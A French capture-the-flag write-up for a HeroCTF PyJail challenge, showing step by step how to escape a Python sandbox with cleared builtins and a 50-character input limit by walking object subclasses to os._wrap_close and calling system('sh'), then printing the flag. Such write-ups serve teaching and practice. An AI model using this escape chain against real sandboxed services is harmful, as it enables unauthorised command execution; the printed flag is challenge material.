Dernier challenge de la lignée des PyJail ! Celui là est un cran au-dessus niveau difficulté, et est en bonus dans ce CTF pour débutant :)

Grâce au code source, on peut voir que les fonctions de base de python ("builtins") sont effacées, comme que tous les modules.
```python
__builtins__ = None
modules.clear()
del modules
```
Pour faire fonctionner le programme, nous avons juste besoin des fonctions `exec`, `print` et `input` que le programme "redéfinit".
```python
exec = exec
_print = print
_raw_input = input
```
De plus, le programme limite la taille de l'input à 50 caractères, ce qui empêche l'appel à `pOpen`.
```python
exec('x='+_raw_input()[:50], d)
```
Il faut donc fouiller dans les objets de python pour espérer trouver des choses intéressantes.
- On part d'un tuple vide: `()`
- On récupère la classe tuple: `().__class__`
- On récupère la class parente de type "object": `().__class__.__base__`
- On regarde les sous class de la class mère "objet": `().__class__.__base__.__subclasses__()`

Retour : `[<class 'type'>, ..., <class 'os._wrap_close'>, ..., <class '_sitebuiltins._Helper'>]`

On récupère ainsi la classe "os._wrap_close" qui est intéressante, elle se situe en position 4 en partant de la fin, donc [-4] : 
`().__class__.__base__.__subclasses__()[-4]`

Cependant, la taille de 50 caractères nous bloque. Pour remédier à cela on peut donc stocker notre avancement dans les fonctions builtins.
```python
__builtins__['a']=().__class__.__base__
__builtins__['b']=__builtins__['a'].__subclasses__
__builtins__['c']=__builtins__['b']()[-4]
```
`__builtins__['c']` contient donc la classe `os._wrap_close` qui va nous permettre d'exécuter des commandes avec la fonction `system`.
On initialise la classe `os._wrap_close` : `__builtins__['d']=__builtins__['c'].__init__`

On exécute la fonction system avec paramètre `sh` : `__builtins__['d'].__globals__['system']('sh')`

On a enfin un shell (en partant d'un tuple vide, et oui) !
```bash
$ cat god_flag.txt
HeroCTF{0k_y0ur_4_g0d_0f_pyth0n}
```
HeroCTF{0k_y0ur_4_g0d_0f_pyth0n}
